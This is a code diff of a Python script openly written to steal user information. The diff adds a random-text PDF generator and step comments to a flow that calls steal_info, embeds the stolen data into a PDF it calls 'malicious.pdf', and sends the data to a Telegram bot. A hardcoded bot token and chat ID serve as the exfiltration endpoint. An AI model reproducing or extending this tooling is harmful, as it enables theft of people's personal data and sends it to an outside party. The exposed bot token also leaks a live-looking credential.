@@ -1,6 +1,19 @@
 import requests
 import PyPDF2
 import telebot
+from fpdf import FPDF
+import random
+import string
+
+# Function to create a PDF with random text
+def create_random_pdf(filename):
+    pdf = FPDF()
+    pdf.add_page()
+    pdf.set_font("Arial", size=12)
+    random_text = ''.join(random.choices(string.ascii_letters + string.digits + " ", k=500))
+    pdf.multi_cell(0, 10, random_text)
+    pdf.output(filename)
+    print(f"{filename} created with random text.")
 
 # Function to steal user info
 def steal_info():
@@ -26,6 +39,7 @@ def add_malware_to_pdf(malware, pdf):
     pdf_writer.write(stream)
     stream.close()
     file.close()
+    print("Malicious PDF created: malicious.pdf")
 
 # Function to send data to Telegram
 def send_to_telegram(telegram_token, chat_id, data):
@@ -40,11 +54,15 @@ telegram_token = "8141276530:AAGXtlMv6psShidQvlahK8jhPXDjEKD4Ceg"
 chat_id = 1702319284
 
 # Main execution
+# Step 1: Create a random PDF
+create_random_pdf("hello.pdf")
+
+# Step 2: Steal user info
 info = steal_info()
 print(info)
 
-# Add stolen info as "malware" to a PDF file
+# Step 3: Add stolen info as "malware" to the PDF file
 add_malware_to_pdf(info[0] + info[1], "hello.pdf")
 
-# Send stolen info to Telegram
-send_to_telegram(telegram_token, chat_id, info) 
+# Step 4: Send stolen info to Telegram
+send_to_telegram(telegram_token, chat_id, info)
